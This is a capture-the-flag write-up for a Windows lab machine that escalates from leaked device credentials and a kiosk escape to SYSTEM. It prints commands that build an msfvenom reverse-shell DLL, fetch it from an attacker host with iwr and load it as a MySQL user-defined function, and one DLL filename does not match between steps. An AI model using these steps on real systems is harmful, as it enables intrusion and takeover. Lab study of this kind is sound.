Summary

Touch exposes a Nexion DeviceHub web interface and a Windows RDP service. A booking confirmation recovered from the previous Layover machine authenticates to the DeviceHub dashboard, which contains kiosk credentials. RDP access leads to a locked-down passport-scanning kiosk; stopping its services exposes an error workflow that can be used to open Explorer and launch a command prompt. For privilege escalation, a writable MySQL installation runs as SYSTEM, while a scheduled batch file reveals the database root password. A malicious DLL registered as a MySQL user-defined function provides a SYSTEM shell.

The exposed services include RDP on port 3389 and a web application on port 8443. The web service identifies itself as Nexion DeviceHub, with a login page for the Nexion DocReader and DeviceHub DH-100 at Gate B7.

A clue carried over from the Layover machine provides a name and booking confirmation code:

"In the Layover machine, you uncovered a nae and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M"

The confirmation code is not immediately useful as an application password, but it establishes the connection to the previous machine and provides a candidate credential to test.

DeviceHub Access

Content enumeration against the API reveals two useful routes:

feroxbuster -u http://touch.htb:8443/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
403      GET        1l        2w       35c http://touch.htb:8443/api
405      GET        1l        3w       30c http://touch.htb:8443/api/scan
200      GET        1l        3w      116c http://touch.htb:8443/api/status

The status endpoint discloses the device serial number and firmware details:

device  "Nexion DeviceHub DH-100"
serial  "NX-DH-2024-B7042"
firmware  "1.4.2"
status  "online"
uptime  74026

The serial value works as the password for the DeviceHub login page. After authenticating, the dashboard exposes the credentials used by the passport scanner:

Username  KioskUser
Password  K!0sk2026#

Initial Access

Use the kiosk credentials to connect through RDP:

xfreerdp /v:10.129.118.155 /u:KioskUser /p:'K!0sk2026#' /dynamic-resolution +clipboard /cert:ignore

The session opens inside a passport-scanning application. The kiosk restrictions prevent a normal escape, so the scanner workflow itself is used to reach a desktop process.

  1. Stop the printer and scanner services from the dashboard.
  2. Attempt to log in as administrator or perform another action in the kiosk.
  3. Wait for the resulting error dialog and select its link.
  4. When Edge opens, right-click the page and choose Save as.
  5. The Save As dialog opens an Explorer window.
  6. Enter cmd in the path field to launch a command prompt.

This provides access to the kiosk user and the user flag.

Privilege Escalation

First, inspect the current token groups:

whoami /groups

KIOSK-042\Printer Administrators

Reviewing the root of C:\ reveals MySQL and ProgramData. The MySQL installation contains many executables and DLLs, and the service runs with SYSTEM privileges. More importantly, C:\MySQL\bin is writable, making the installation a candidate for DLL hijacking.

The ProgramData directory contains refresh-dates.bat, which discloses the MySQL root password in plaintext:

type .\refresh-dates.bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul

Build a Windows reverse-shell DLL, transfer it to the writable MySQL plugin directory, and start a listener:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.xxxx2 LPORT=9001 -f dll -o evil.dll
rlwrap nc -lvnp 9001
python3 -m http.server 80
iwr -uri http://10xxxx2/evil.dll -outfile C:\MySQL\lib\plugin\evil.dll

Register the DLL as a MySQL user-defined function. The MySQL service loads the library with SYSTEM privileges:

C:\MySQL\bin\mysql.exe -u root "-pHTB@irw4ys_DB!2026" -e "DROP FUNCTION IF EXISTS sys_exec; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';"

Check the listener after invoking the function. The resulting shell is running as NT AUTHORITY\SYSTEM. Retrieve the root flag.
